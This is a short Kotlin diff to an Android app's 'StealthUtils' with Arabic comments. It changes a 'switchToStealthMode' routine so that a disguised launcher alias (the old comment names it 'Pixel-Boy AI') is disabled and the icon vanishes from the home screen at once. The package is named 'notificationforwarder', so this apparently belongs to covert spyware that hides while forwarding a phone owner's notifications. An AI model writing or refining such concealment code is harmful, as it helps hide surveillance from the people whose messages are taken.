@@ -9,18 +9,17 @@ object StealthUtils {
     fun switchToStealthMode(context: Context) {
         val packageManager = context.packageManager
 
-        // استهداف الواجهة المستعارة (Pixel-Boy AI)
+        // تعطيل MainActivityAlias الظاهر على الشاشة الرئيسية
         val aliasComponent = ComponentName(
             context.packageName,
             "com.itsazni.notificationforwarder.MainActivityAlias"
         )
 
         try {
-            // تعطيل الواجهة لتختفي تماماً من الشاشة الرئيسية
             packageManager.setComponentEnabledSetting(
                 aliasComponent,
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                PackageManager.DONT_KILL_APP
+                0 // لإجبار لانشر الموبايل على حذف الأيقونة فوراً
             )
         } catch (e: Exception) {
             e.printStackTrace()
